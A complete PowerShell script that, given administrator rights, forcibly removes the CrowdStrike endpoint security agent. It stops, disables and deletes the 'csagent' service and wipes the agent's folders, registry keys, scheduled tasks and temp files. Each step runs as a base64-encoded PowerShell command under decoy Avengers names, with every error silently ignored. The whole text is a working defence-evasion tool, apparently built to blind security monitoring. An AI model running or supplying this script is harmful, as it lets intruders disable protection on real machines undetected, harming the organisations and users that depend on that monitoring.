if (!([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Error "You must run this script as an administrator."
    exit
}

function avengers {
    param (
        [string]$x
    )

    $b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($x))
    powershell.exe -EncodedCommand $b64
}

$ironman = @'
$svr = "csagent"
try {
    Get-WmiObject -Query "SELECT * FROM Win32_Service WHERE Name='$svr'" | ForEach-Object { $_.StopService() }
} catch {}
try {
    Get-WmiObject -Query "SELECT * FROM Win32_Service WHERE Name='$svr'" | ForEach-Object { $_.ChangeStartMode('Disabled') }
} catch {}
try {
    Get-WmiObject -Query "SELECT * FROM Win32_Service WHERE Name='$svr'" | ForEach-Object { $_.Delete() }
} catch {}
'@

$thor = @'
$dirs = @("C:\Program Files\CrowdStrike", "C:\Program Files\Common Files\CrowdStrike", "C:\ProgramData\CrowdStrike")
foreach ($d in $dirs) {
    try {
        if (Test-Path $d) {
            $f = Get-WmiObject -Query "SELECT * FROM CIM_DataFile WHERE Path='$($d.Replace('\', '\\'))'"
            $f | ForEach-Object { $_.Delete() }
            Remove-Item -Path $d -Recurse -Force -ErrorAction Stop
        }
    } catch {}
}
'@

$hulk = @'
$rp = @("HKLM:\SOFTWARE\CrowdStrike", "HKLM:\SOFTWARE\Wow6432Node\CrowdStrike", "HKLM:\SYSTEM\CurrentControlSet\Services\csagent", "HKLM:\SYSTEM\CurrentControlSet\Services\CrowdStrike")
foreach ($p in $rp) {
    try {
        if (Test-Path $p) {
            Remove-Item -Path $p -Recurse -Force -ErrorAction Stop
        }
    } catch {}
}
'@

$captainAmerica = @'
try {
    $tsks = Get-ScheduledTask | Where-Object { $_.TaskName -like "*CrowdStrike*" }
    foreach ($t in $tsks) {
        Unregister-ScheduledTask -TaskName $t.TaskName -Confirm:$false
    }
} catch {}
'@

$blackWidow = @'
$tps = @("$env:TEMP", "$env:TMP", "C:\Windows\Temp")
foreach ($tp in $tps) {
    try {
        $tf = Get-WmiObject -Query "SELECT * FROM CIM_DataFile WHERE Path='$($tp.Replace('\', '\\'))'"
        $tf | ForEach-Object { 
            if ($_.FileName -like "*CrowdStrike*") { 
                $_.Delete()
            }
        }
    } catch {}
}
'@

avengers $ironman
avengers $thor
avengers $hulk
avengers $captainAmerica
avengers $blackWidow

Write-Host "The Avengers assembled and Hulk smashed the villain."
